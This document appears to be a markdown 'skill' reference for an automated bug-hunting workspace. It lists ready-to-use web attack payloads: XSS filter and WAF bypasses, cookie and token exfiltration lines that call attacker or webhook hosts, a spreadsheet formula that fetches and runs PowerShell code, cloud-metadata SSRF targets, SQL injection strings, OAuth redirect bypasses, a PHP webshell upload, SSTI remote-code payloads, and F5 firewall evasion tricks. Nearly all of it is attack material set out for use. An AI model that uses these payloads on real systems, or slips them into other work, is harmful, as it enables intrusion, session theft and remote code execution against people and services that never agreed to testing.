---
name: payloads
description: Bypass and payload tables (SSRF IP, OAuth redirect_uri, upload, XSS WAF, SSTI per-engine) for hop exploitation.
---

# Payload Reference

## XSS Payloads

### Basic
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
```

### WAF Bypass
```
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

#### Stacked-encoding DOM XSS (Akamai-bypass reference)

The WAF decodes the payload once; the target decodes twice. Stacking three encodings
inside a single payload defeats Akamai / CF / AWS WAF regex filters because every
dangerous keyword and metacharacter is hidden behind a second decode that only the
app's client-side JS performs.

```
<a href=&#106avascript:'%5Cu003C'+'svg/'+'onload%5Cu003Dalert%5Cu0028)\\u003E'>Click
```

Encoding breakdown:
- `&#106` — HTML entity decimal for `j`, hides the `javascript:` keyword from the WAF.
- `%5C` — URL-encoded `\`, pairs with the following `u` so the URL-decoded
  output becomes `<` etc. — i.e. the literal unicode-escape `<` is itself
  obfuscated by writing the `u` as `u`.
- `<` / `=` / `(` / `>` — Unicode escapes for `<`, `=`, `(`, `>`.

Decode path the app takes (example from a real target):
1. `URLSearchParams(window.location.search)` + `JSON.parse` — URL-decodes once, HTML
   entities resolve: `<a href=javascript:'<'+'svg/'+'onload=alert()>'>`.
2. `decodeURIComponent(o)` on the extracted value — Unicode escapes resolve:
   `<a href=javascript:'<'+'svg/'+'onload=alert()>'>`.
3. Final sink render — `<a href="javascript:'<svg/onload=alert()>'">` executes the SVG.

Use this payload as the baseline when the target does **any** client-side decode of
user input AND a WAF is between you and the sink. If it gets blocked, iterate the
layer order: `url→html-entity→unicode`, `html-entity→unicode→url`, etc.

### Context-Specific
```
# In attribute: " onmouseover="alert(1)" x="
# In JS string: ';alert(1)//
# In template: {{constructor.constructor('alert(1)')()}}
# In URL/href: javascript:alert(1)
# In SVG: <svg onload="alert(1)">
```

### Detection Mechanism Rotation Ladder (mandatory — `alert(1)` is tier 1 of 7)

`alert(1)` is the most-WAF-blocked, most-overridden detection token in the
field. If your first probe fires an `alert`-shaped payload and gets a block
or null response, **DO NOT conclude "no XSS"** — rotate through the ladder
below. Every XSS hunter, browser-verifier, and surface-probe SPA seed in
this workspace MUST walk these tiers in order until execution is
confirmed or all 7 tiers are exhausted.

```text
Tier 1: alert(1)              ← blocked by ~70% of WAFs and any page that does `window.alert = ()=>{}`
Tier 2: prompt(1) / confirm(1) / print()  ← rotate when alert string is regex-blocked
Tier 3: console.log(1)        ← silent in UI, visible in DevTools / Playwright console listener
Tier 4: DOM marker mutation   ← survives every dialog override, easy to detect
Tier 5: Global property write ← detect via window['xss_proof'] readback
Tier 6: OOB callback (fetch / Image)  ← proves exec AND captures cookies AND defeats every dialog defense
Tier 7: Constructor / encoded indirect call  ← when literal token "alert/prompt/confirm" filtered
```

**Tier 1 — `alert/prompt/confirm` direct.** Default first try.
```javascript
alert(1)
prompt(1)
confirm(1)
print()                 // opens print dialog — visible in headed browser, hookable headless
```

**Tier 2 — `alert` string regex-blocked, dialog functions still callable.**
```javascript
prompt(1)
confirm(document.domain)
print()
window.find('marker') // observable via mutation
```

**Tier 3 — Console marker (silent UI, visible to test harness).**
```javascript
console.log('XSS-AAB123')
console.error('XSS-AAB123')
console.table({xss:'AAB123'})
```

**Tier 4 — DOM marker mutation (most reliable; works under every dialog
override).**
```javascript
document.title='XSS-AAB123'                                        // read window.title back
document.body.setAttribute('data-xss','AAB123')                    // read DOM attr back
document.documentElement.dataset.xss='AAB123'                      // same, dataset variant
document.body.append(Object.assign(document.createElement('span'),{id:'xss',textContent:'AAB123'}))
```

**Tier 5 — Global property write (programmatic detection).**
```javascript
window.xss_proof=Date.now()                                        // read window.xss_proof back
top.__xss=true                                                      // even works through frames
self[Symbol.for('xss')]=1
```

**Tier 6 — OOB callback (defeats every dialog defense; doubles as impact proof).**
Use interactsh / oast.fun / your-canary-domain. Captures cookies in one shot.
```javascript
fetch('//c.oast.fun/?'+document.cookie)
new Image().src='//c.oast.fun/?'+btoa(document.cookie)
navigator.sendBeacon('//c.oast.fun/',document.cookie)
new WebSocket('wss://c.oast.fun/?'+document.cookie)
new EventSource('//c.oast.fun/?'+document.cookie)
// CSP-aware variants when connect-src is locked:
// resource-typed sinks usually escape connect-src filtering
new Image().src=`//c.oast.fun/?${document.cookie}`               // img-src
document.head.append(Object.assign(document.createElement('link'),{rel:'preload',href:'//c.oast.fun/?'+document.cookie,as:'image'}))
document.head.append(Object.assign(document.createElement('link'),{rel:'dns-prefetch',href:'//'+btoa(document.cookie)+'.oast.fun'}))  // dns-only exfil
```

**Tier 7 — Constructor / encoded indirect call (when literal `alert`/`prompt`/`confirm` token is regex-filtered).**
```javascript
[]['constructor']['constructor']('alert(1)')()
new Function('alert(1)')()
Reflect.construct(Function,['alert(1)'])()
window['ale'+'rt'](1)                                              // string-split
top[/al/.source+/ert/.source](1)                                   // regex-source split
window[String.fromCharCode(97,108,101,114,116)](1)                 // char-code build
window[atob('YWxlcnQ=')](1)                                        // base64 build
top[8680439..toString(30)](1)                                       // base-30 numeric (CF bypass)
self[Symbol.for('alert')]?.(1) || self['alert'](1)            // unicode escape
// Tagged-template variants — useful when parens are filtered too:
alert`1`
setTimeout`alert\x281\x29`
```

### Detection Rotation Decision Tree (use when first probe gets blocked)

```
First probe blocked or returned no execution evidence?
├─ WAF returned 403/406/501 on the request itself
│   → encode payload (Tier 1 → URL/HTML/double-encoded), retry same tier
│   → if still blocked: jump to Tier 7 (token-encoded)
├─ Request reached origin but no execution detected
│   ├─ window.alert overridden → Tier 2 (prompt/confirm/print)
│   ├─ all dialogs overridden → Tier 4 (DOM marker)
│   ├─ headless / no UI to read → Tier 3 (console) or Tier 5 (global)
│   └─ CSP blocks inline / dialog noise → Tier 6 (OOB) — also captures cookies
└─ Reflection but no fire → context is wrong
    → reconfirm context (HTML body / attr / JS string / JSON / URL)
    → re-pick payload from "Context-Specific" section, restart at Tier 1
```

A hunter that reports "no XSS — alert(1) blocked" without walking tiers
2-7 has a shallow result and will be re-dispatched. Same applies for
"alert(1) didn't fire" — that proves the dialog API is muted, not that
execution is absent.

### Modern Browser Auto-Fire Triggers
No user interaction needed — these execute on render. Use when `<script>` is
filtered or the sink is HTML body / attribute context.

```html
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<details open onbeforetoggle=alert(1)>
<button popovertarget=x>x</button><div popover id=x onbeforetoggle=alert(1)>
<html onbeforematch=alert(1)><div hidden=until-found id=x></div>
<input type=search value=x onsearch=alert(1) autofocus>
<body onpageshow=alert(1)>
<body onresize=alert(1)>
<body onorientationchange=alert(1)>
<marquee onstart=alert(1)>x</marquee>
<marquee width=10 loop=2 behavior=alternate onbounce=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<video><source onerror=alert(1)>
<video controls onloadeddata=alert(1)><source src=x>
<video controls onloadedmetadata=alert(1)><source src=x>
<audio src=x onerror=alert(1)>
<audio autoplay onplaying=alert(1)><source src=x>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y dur=1s>
<svg><animateMotion onbegin=alert(1) dur=1s>
<svg><feImage onload=alert(1) href=data:,>
<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>
<div onanimationend=alert(1) style=animation:spin\ 1s>
<div ontransitionend=alert(1) style=transition:all\ 1s>
```

### Framework-Specific Sinks (React / Angular / Vue / jQuery / Bootstrap)
Test client-rendered apps for these constructs — they short-circuit framework
sanitization. The user-controlled value goes straight into the sink.

```jsx
// React — dangerouslySetInnerHTML, ref callbacks, JSX URL attribute
<div dangerouslySetInnerHTML={{__html: userInput}} />
<img src={`javascript:alert(1)`} />
<div ref={(el)=>el && eval(userInput)} />
<iframe src={`data:text/html,<script>alert(1)</script>`} />
<div style={{backgroundImage: `url(javascript:alert(1))`}} />
React.createElement('img',{src:'x',onError:()=>alert(1)})
```
```html
<!-- Angular — [innerHTML], DomSanitizer.bypassSecurityTrust*, *ngFor render -->
<div [innerHTML]="userInput"></div>
<iframe [src]="sanitizer.bypassSecurityTrustResourceUrl('javascript:alert(1)')"></iframe>
<div *ngFor="let i of items" [innerHTML]="i.content"></div>
<template [innerHTML]="trustHtml('<script>alert(1)</script>')"></template>
<div [routerLink]="['/p', userInput]" (click)="eval(userInput)">x</div>

<!-- Vue — v-html, :is dynamic component, :src/:style binding -->
<div v-html="userInput"></div>
<component :is="userInput"></component>
<img :src="'javascript:alert(1)'" />
<div :style="{backgroundImage:'url(javascript:alert(1))'}"></div>
<iframe :src="$sanitize('<script>alert(1)</script>')"></iframe>
```
```javascript
// jQuery — .html / .append / .attr / $.globalEval / .load
$('#t').html(userInput)
$('#t').append('<img src=x onerror=alert(1)>')
$(userInput).appendTo('body')
$('#t').attr('onclick','alert(1)')
$.globalEval(userInput)
$('#t').load('data:text/html,<script>alert(1)</script>')
```
```html
<!-- Bootstrap — data-bs-html=true on tooltip / popover renders raw HTML -->
<div data-bs-toggle="tooltip" data-bs-html="true" title="<img src=x onerror=alert(1)>">
<div data-bs-toggle="popover" data-bs-html="true" data-bs-content="<script>alert(1)</script>">
```

### JSONP Callback Abuse via Trusted CDNs (CSP whitelist bypass)
When CSP allows `*.google.com`, `*.facebook.com`, `*.twitter.com`, etc., point
`<script src>` at any JSONP endpoint on that origin and pass `alert(1)` as the
`callback` / `jsonp` parameter — the response wraps your JS in a real script
that loads from the trusted origin.

```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>
<script src="https://suggestqueries.google.com/complete/search?client=youtube&jsonp=alert(1);"></script>
<script src="https://api.twitter.com/1/statuses/oembed.json?callback=alert(1);"></script>
<script src="https://cdn.syndication.twimg.com/widgets/timelines?callback=alert(1);"></script>
<script src="https://www.youtube.com/oembed?callback=alert(1);"></script>
<script src="https://api.github.com/repos/user/repo?callback=alert(1);"></script>
<script src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&appId=123&callback=alert(1);"></script>
<script src="https://graph.facebook.com/me?callback=alert"></script>
<script src="https://vimeo.com/api/oembed.json?callback=alert(1);"></script>
<script src="https://api.flickr.com/services/rest?format=json&jsoncallback=alert(1);"></script>
<script src="https://api.imgur.com/3/gallery/hot?callback=alert"></script>
<script src="https://api.reddit.com/r/all/hot.json?jsonp=alert"></script>
<script src="https://api.tumblr.com/v2/blog/x.tumblr.com/info?callback=alert"></script>
<script src="https://api.soundcloud.com/resolve?url=http://soundcloud.com/x&callback=alert"></script>
<script src="https://api.twitch.tv/kraken/users/x?callback=alert"></script>
```

### `alert` / `(`/`'` Blocked → Function-Constructor and Indirect-Call Variants
```javascript
// alert blocked → reach it through prototype/constructor chains
[]['constructor']['constructor']('alert(1)')()
({}).constructor.constructor('alert(1)')()
(()=>{}).constructor('alert(1)')()
(async()=>{}).constructor('alert(1)')()
(function*(){}).constructor('alert(1)')()
new Function('alert(1)')()
Reflect.construct(Function,['alert(1)'])()
Reflect.apply(eval,window,['alert(1)'])

// alert blocked, "alert" string blocked → assemble at runtime
window['ale'+'rt'](1)
self[`al`+`ert`](1)
globalThis['ale'+'rt'](1)
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)              // base-30 string trick
window[atob('YWxlcnQ=')](1)
window[String.fromCharCode(97,108,101,114,116)](1)
Object.getPrototypeOf(window).alert.call(this,1)
Reflect.get(window,'alert')(1)

// Parens blocked → tagged template literals
alert`1`
setTimeout`alert\x281\x29`
new Function`return alert``1`
throw new Error`alert\x281\x29`           // window.onerror sink
location.replace`javascript:alert\x281\x29`

// Quotes blocked
alert(/XSS/.source)
alert(String.fromCharCode(49))
alert(parseInt(1))
```

### Encoding & Unicode Filter Bypass
```html
<!-- HTML entity (decimal / hex) inside attribute or comment -->
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Double URL encode (server decodes once, browser decodes again) -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Octal HTML escape -->
\74script\76alert(1)\74/script\76

<!-- JS Unicode escapes inside identifier (parses as alert) -->
<script>alert(1)</script>
<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
<img src=x onload=alert(1)>
<svg onload=alert(1)>

<!-- Mixed string escape -->
<script>eval('alert(1)')</script>
<script>eval('al\x65rt(1)')</script>
<script>eval('ale\162t(1)')</script>
<script>eval(unescape('%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029'))</script>

<!-- Homoglyph / fullwidth (filter is ASCII-only) -->
<ｓｃｒｉｐｔ>alert(1)</ｓｃｒｉｐｔ>
<script>аlert(1)</script>            <!-- Cyrillic 'а' -->
<ſcript>alert(1)</ſcript>            <!-- Latin long-S -->
<script>αlert(1)</script>            <!-- Greek alpha -->

<!-- Bidi / zero-width injection -->
<scr‌ipt>alert(1)</scr‌ipt>           <!-- ZWNJ inside identifier -->
<script>alert(1/*‮⁦x⁩‭*/)</script>    <!-- RLO/LRI/PDI -->

<!-- Whitespace inside tag (parsers differ on accepted separators) -->
<script\x09src=data:,alert(1)></script>
<script\x0Asrc=data:,alert(1)></script>
<script\x0Csrc=data:,alert(1)></script>
<img\x20src=x\x20onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img&#32;src=x&#32;onerror=alert(1)>
<img\fsrc=x\fonerror=alert(1)>
```

### Tag-Confusion / Parser-Differential
Filter strips one occurrence of `<script>`, or HTML parser absorbs malformed
input differently than the regex.

```html
<scr<script>ipt>alert(1)</script>
<<script>alert(1)</script>
<script<>alert(1)</script>
<svg><script>alert&#40;1&#41;</script></svg>

<!-- noscript / xmp / noframes / noembed parsing escape -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>
<noembed><p title="</noembed><img src=x onerror=alert(1)>"></p>
<noframes><p title="</noframes><img src=x onerror=alert(1)>"></p>
<xmp><script>alert(1)</script></xmp>
<plaintext><script>alert(1)</script>
<listing><script>alert(1)</script></listing>

<!-- Math / SVG foreign-content lift (HTML5 parser quirk) -->
<math><mtext><option><FAKE><option><mglyph><svg><mtext><textarea><path id=*/alert(1)/*>
<math><mi xlink:href="javascript:alert(1)">XSS</mi>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
<svg><use href="#x"/></svg><defs><g id="x"><script>alert(1)</script></g></defs>
<svg><a xlink:href="javascript:alert(1)"><text>XSS</text></a></svg>

<!-- Form / table re-parenting bug -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
<svg></p><style><g title="</style><img src=x onerror=alert(1)>">

<!-- Nested closing tags break naive regex -->
</script><svg/onload=alert(1)>
</title><script>alert(1)</script>
</style><script>alert(1)</script>
</textarea><script>alert(1)</script>
```

### CSP Nonce / Base-Tag / `srcdoc` Bypass
```html
<!-- Empty / null / commented nonce often valid in misconfigured CSP -->
<script nonce="">alert(1)</script>
<script nonce="null">alert(1)</script>
<script nonce="undefined">alert(1)</script>
<script nonce="<!-- comment -->">alert(1)</script>

<!-- Base-tag CSP bypass — overrides relative <script src> -->
<base href="data:"><script nonce="VALID_NONCE_FROM_PAGE" src="text/javascript,alert(1)"></script>
<base href="//evil.com/"><script src="evil.js"></script>

<!-- iframe srcdoc — child frame inherits SOP, runs script even if parent CSP blocks inline -->
<iframe srcdoc="<script>parent.alert(1)</script>">
<iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">

<!-- Dynamic ESM import -->
<script>import('data:text/javascript,alert(1)')</script>
<script>import(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>

<!-- ServiceWorker / SharedWorker / Worker code execution -->
<script>new Worker(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>
<script>navigator.serviceWorker.register('data:text/javascript,fetch(`//pwned.attacker.com`)')</script>
```

### postMessage Listener → Sink Chains (DOM XSS escalation)
```javascript
// Listener that eval()s message body
window.addEventListener('message', e => Function(e.data)());
postMessage('alert(1)', '*');

// Listener that redirects to message
window.addEventListener('message', e => location = e.data);
postMessage('javascript:alert(1)', '*');

// document.write of message body
window.onmessage = e => document.write(e.data);
postMessage('<img src=x onerror=alert(1)>', '*');

// BroadcastChannel cross-tab
new BroadcastChannel('xss').postMessage('alert(1)');
new BroadcastChannel('xss').onmessage = e => eval(e.data);
```

### Mutation / Animation / Observer Auto-Fire (silent execution)
```html
<style>@keyframes x{}</style>
<div onanimationstart=alert(1) style=animation:x\ 1s>
<div onanimationend=alert(1) style=animation:spin\ 1s>
<div ontransitionend=alert(1) style=transition:all\ 1s onmouseover=this.style.color='red'>
<script>new MutationObserver(()=>alert(1)).observe(document,{childList:true,subtree:true})</script>
<script>new ResizeObserver(()=>alert(1)).observe(document.body)</script>
<script>new IntersectionObserver(()=>alert(1)).observe(document.body)</script>
<script>new PerformanceObserver(()=>alert(1)).observe({entryTypes:['navigation']})</script>
```

### Mobile Touch / Pointer / Gesture Triggers
```html
<div ontouchstart=alert(1)>x</div>
<div ontouchend=alert(1)>x</div>
<div ontouchmove=alert(1)>x</div>
<div onpointerdown=alert(1)>x</div>
<div onpointerup=alert(1)>x</div>
<div ongesturestart=alert(1)>x</div>
<div ongesturechange=alert(1)>x</div>
<body ondevicemotion=alert(1)>
<body ondeviceorientation=alert(1)>
```

### Shadow DOM / Template / Web Components
```html
<!-- Declarative shadow DOM with slotchange -->
<template shadowrootmode=open><slot onslotchange=alert(1)>

<!-- Template content not parsed until cloned -->
<template><script>alert(1)</script></template>

<!-- Closed shadow root hides payload from DOM scanners -->
<div id=x><script>document.getElementById('x').attachShadow({mode:'closed'}).innerHTML='<img src=x onerror=alert(1)>'</script></div>

<!-- Dialog (less filtered than script/img) -->
<dialog open onclose="fetch('https://YOUR_SERVER/?c='+document.cookie)">x</dialog>
```

### Cookie / Token / DOM Exfil Templates (replace alert in real PoC)
```javascript
// Cookie / CSRF token exfil
fetch('https://YOUR_SERVER/?c='+document.cookie)
new Image().src='https://YOUR_SERVER/?c='+document.cookie
navigator.sendBeacon('https://YOUR_SERVER/log', document.body.innerHTML)
fetch('https://YOUR_SERVER/?t='+document.querySelector('meta[name=csrf-token]').content)

// DNS exfil — works when outbound HTTP is firewalled
fetch(`//${btoa(document.cookie)}.YOUR_SERVER`)
new Image().src=`//${location.hostname.replace(/\./g,'-')}.YOUR_SERVER`

// State-changing PoC — read CSRF token, then submit POST in victim session
fetch('/account/email').then(r=>r.text()).then(html=>{
  const t = html.match(/name="csrf"[^>]*value="([^"]+)"/)[1];
  fetch('/account/email',{method:'POST',body:new URLSearchParams({csrf:t,email:'attacker@x'})});
});

// Storage / IDB scrape
JSON.stringify(localStorage)
JSON.stringify(sessionStorage)

// Service-worker persistence (survives navigation)
navigator.serviceWorker.register('data:text/javascript,addEventListener("fetch",e=>e.respondWith(new Response("pwn")))')
```

### Webhook-Backed Universal Reporter Polyglot
Drops into almost any context (script/title/style/textarea/iframe/noscript) and
exfils host + path + cookie to your webhook.

```html
//*'/*\'/*"/*\"/*`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript>
<script>
l=window.location;d=document;
new Image().src='https://YOUR_WEBHOOK/?h='+l.host+'&p='+l.pathname+'&s='+l.search+'&c='+d.cookie;
</script>
```

XHR variant (POST, larger payload, includes UUID for de-dup):

```html
//*'/*\'/*"/*\"/*`/*\`--></Title/</Style/</Script/</textArea/</iFrame/</noScript>
<script>var x=new XMLHttpRequest();l=window.location;
x.open('POST','https://YOUR_WEBHOOK');
x.setRequestHeader('Content-type','application/x-www-form-urlencoded');
x.send('i=UUID&h='+l.host+'&p='+l.pathname+'&s='+l.search+'&c='+document.cookie);
</script>
```

### JJEncode / Alphabet-Free (filter blocks alphanumerics or keywords)
```javascript
// JSFuck — only []()!+ characters, builds any string from coercion primitives
[]["constructor"]["constructor"]("alert(1)")()
""["constructor"]["constructor"]("alert(1)")()

// Non-ASCII identifier alphabet — JS allows Unicode identifiers, so build alert
// out of CJK / Arabic / Cuneiform variable names. Useful when filter blocks
// only ASCII letters or specific keywords.
ا='',ب=!ا+ا,ت=!ب+ا,ث=ا+{},ج=ب[ا++],ح=ب[خ=ا],د=++خ+ا,ذ=ث[خ+د],
ب[ذ+=ث[ا]+(ب.ت+ث)[ا]+ت[د]+ج+ح+ب[خ]+ذ+ج+ث[ا]+ح][ذ](ت[ا]+ت[خ]+ب[د]+ح+ج+"(1)")()

甲='',乙=!甲+甲,丙=!乙+甲,丁=甲+{},戊=乙[甲++],己=乙[庚=甲],辛=++庚+甲,壬=丁[庚+辛],
乙[壬+=丁[甲]+(乙.丙+丁)[甲]+丙[辛]+戊+己+乙[庚]+壬+戊+丁[甲]+己][壬](丙[甲]+丙[庚]+乙[辛]+己+戊+"(1)")()
```

### `javascript:` URL Variants (link / form / iframe sinks)
```
javascript:alert(1)
JaVaScRiPt:alert(1)
java&#x09;script:alert(1)
java&#x0A;script:alert(1)
java&#x0D;script:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
JavaScript://%250Aalert(1)//
javascript:`${alert(1)}`
data:text/html,<script>alert(1)</script>
data:text/javascript,alert(1)
vbscript:alert(1)
```

### CSV / Spreadsheet Formula Injection (XSS-adjacent)
Stored input rendered into Excel / Sheets / LibreOffice → DDE / hyperlink
exec on open. Submit as report when the export is delivered to internal staff.

```
=cmd|'/C calc'!A1
=HYPERLINK("http://evil.com","Click me")
@SUM(1+1)*cmd|'/C calc'!A1
=2+3+cmd|'/C powershell IEX(wget 0r.pe/p -UseBasicParsing)'!A1
+1-1+cmd|'/C calc'!A1
```

## SSRF Payloads

### Internal Targets
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/
```

### IP Bypass
```
http://127.0.0.1 → http://0x7f000001 → http://2130706433
http://017700000001 (octal)
http://[::ffff:169.254.169.254] (IPv6)
http://localtest.me (DNS → 127.0.0.1)
```

## SQLi Payloads

### Detection
```
' OR '1'='1
" OR "1"="1
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--
```

### Error-Based
```
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

## IDOR Payloads

### ID Manipulation
```
/api/users/YOUR_ID → /api/users/OTHER_ID
/api/users/100 → /api/users/101, /api/users/99, /api/users/0
UUID: try sequential, predictable, or null UUID
GraphQL: { node(id: "base64_encoded_id") { ... on User { email } } }
```

### Method Variation
```
GET /api/resource/123 → 403
PUT /api/resource/123 → 200 (method not checked)
DELETE /api/resource/123 → 200
PATCH /api/resource/123 → 200
```

### Version Downgrade
```
/api/v2/resource/123 → 403 (has auth)
/api/v1/resource/123 → 200 (old version missing auth)
```

## OAuth Payloads

### redirect_uri Bypass
```
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com%23@evil.com
redirect_uri=https://target.com/callback/../redirect?to=evil.com
redirect_uri=https://target.com/callback%2f..%2fredirect%3fto%3devil.com
```

## File Upload Payloads

### Extension Bypass
```
shell.php → shell.php.jpg → shell.pHp → shell.php%00.jpg
shell.php;.jpg → shell.php. → shell.php::$DATA
```

### Content-Type Bypass
```
Content-Type: image/png (with PHP content)
Magic bytes: GIF89a<?php system($_GET['c']); ?>
SVG XSS: <svg onload="alert(1)">
```

## Race Condition
```bash
# 20 parallel requests:
seq 1 20 | xargs -P 20 -I {} curl -s "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" -d '{"code":"DISCOUNT50"}'

# With timing via turbo-intruder or curl multi:
for i in $(seq 1 50); do
  curl -s "https://target/api/transfer" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"amount":100,"to":"attacker"}' &
done; wait
```

## SSTI (Server-Side Template Injection)

### Jinja2 (Python/Flask)
```python
# Detection
{{7*7}}  # Returns 49
{{config}}  # Dumps Flask config

# RCE
{{''.__class__.__mro__[1].__subclasses__()[X]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# Via config globals
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

# Filter bypass (dot blocked)
{%for c in [].__class__.__base__.__subclasses__()%}
{%if c.__name__=='catch_warnings'%}
{{c()._module.__builtins__['__import__']('os').popen('id').read()}}
{%endif%}
{%endfor%}

# Attribute access without dot
{{request['__class__']['__mro__'][1]}}
{{request|attr('__class__')}}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### EJS (Node.js)
```
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Velocity (Java)
```
#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))##
#set($chr = $x.class.forName('java.lang.Character'))##
#set($str = $x.class.forName('java.lang.String'))##
$rt.getRuntime().exec('id')
```

## F5 BIG-IP ASM Bypass Primitives

Validated 2026-05 against banking-grade F5 ASM deployment (the `${...}` SSTI/EL injection rule). All confirmed via raw-socket Python (no shell expansion, no urllib URL-encoding ambiguity) — request bytes inspected on the wire and response classified by F5 soft-block fingerprint (HTTP 200, body `<html><head><title>Request Rejected</title></head>...`, length ≈ 101 bytes).

The F5 soft-block to recognize:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 101

<html><head><title>Request Rejected</title></head><body>The requested URL was rejected.</body></html>
```
Note: status code is 200, NOT 403. Trust the body fingerprint, not the status line. JSON endpoints normally return `Content-Length: 59` baseline; soft-block is `101`.

### 1. JSON Content-Type smuggling (Bugtraq 2015 — F5 said "no fix in near term" — still works in 2026)

F5 ASM matches `*json*` in `Content-Type` and routes the body through its JSON parser, which does NOT URL-decode. URL-encode the payload — F5 doesn't see `${...}` so the rule doesn't fire. The backend then receives the body and parses it normally.

```http
POST /target/endpoint HTTP/1.1
Host: api.target.com
Content-Type: application/json
Content-Length: 16

q=%24%7B7%2A7%7D
```

Confirmed working on `Content-Type` values:
- `application/json`
- `application/json; charset=UTF-8`
- `application/json; foo=bar; junk=true`  (any junk param, just keep `json` substring)
- `text/json`
- `application/vnd.api+json`
- `application/hal+json`
- `application/ld+json`

Same primitive in JSON object form (URL-encoded value inside JSON string) — also passes F5:
```json
{"q":"%24%7B7%2A7%7D"}
```

### 2. UTF-7 encoded payload in query string

UTF-7 encoding for `${7*7}`: `+ACQAew-7*7+AH0-`. F5 ASM does not decode UTF-7 — the rule sees `+ACQAew-...` and doesn't match `${...}`. Backend reaches if it does UTF-7 decoding (some Java apps).

```http
GET /target/endpoint?q=+ACQAew-7*7+AH0- HTTP/1.1
```

### 3. Microsoft IIS-style `%u` Unicode encoding

Fullwidth-ASCII in IIS-format. `%uFE69` ≈ `$`, `%uFE5B` ≈ `{`, `%uFE5D` ≈ `}`.

```http
GET /target/endpoint?q=%uFE69%uFE5B7*7%uFE5D HTTP/1.1
```

F5 doesn't decode `%uXXXX`. Useful when fronting an IIS / older .NET stack that DOES decode this format.

### 4. HTML-entity-then-URL-encoded

HTML entities for `${7*7}`: `&#36;&#123;7*7&#125;`. URL-encoded again: `&%2336;&%23123;7*7&%23125;`. F5 sees ampersand-prefixed numeric strings, no match. Passes through if backend HTML-decodes (rare for query params, common for templated rendering).

```http
GET /target/endpoint?q=&%2336;&%23123;7*7&%23125; HTTP/1.1
```

### 5. Header smuggling — F5 doesn't inspect these for the `${...}` rule

Confirmed PASSED through F5 (rule does not fire):
- `User-Agent: Mozilla/5.0 ${7*7} ...`
- `Cookie: tracking=${7*7}; lang=en`
- `Accept-Language: en-US,${7*7}`

Confirmed BLOCKED by F5 (rule fires):
- `Referer:`, `Origin:`, `X-Forwarded-For:`, `X-Forwarded-Host:`, `X-Forwarded-Proto:`, `X-Real-IP:`, `X-Originating-IP:`, `X-Custom-Header:`, `True-Client-IP:`, `CF-Connecting-IP:`, `X-Client-Data:`, `X-Request-ID:`, `X-Correlation-ID:`, `Forwarded:`

Use case: any endpoint that logs / reflects / templates `User-Agent` or `Cookie` values.

### 6. Alternative SSTI engine syntax (no `${...}` substring)

The F5 rule is specifically anchored on the `${` literal. Alternative templating syntaxes are not matched:

| Engine        | Bypass payload          | Notes                                       |
|---------------|-------------------------|---------------------------------------------|
| Twig / Jinja2 | `{{7*7}}`               | URL-encode braces — passes F5               |
| Thymeleaf     | `*{7*7}` / `[[${7*7}]]` | The `*{` form bypasses; `[[` prefix bypasses |
| Velocity      | `#set($x=7*7)$x`        | `#set` syntax — F5 misses                   |
| Razor         | `@(7*7)` / `@{var x=7*7;}@x` | Razor block syntax                     |
| ERB           | `<%= 7*7 %>` / `<%-= 7*7 -%>` | Ruby ERB syntax                       |
| FreeMarker    | `<#assign x=7*7>${x}`   | `<#assign>` prefix — even with `${x}` inside, F5 still misses (start-anchor) |
| Smarty        | `{$x=7*7}{$x}`          | PHP Smarty                                  |
| Pug / Jade    | `#{7*7}` / `!{7*7}`     | Pug variants                                |
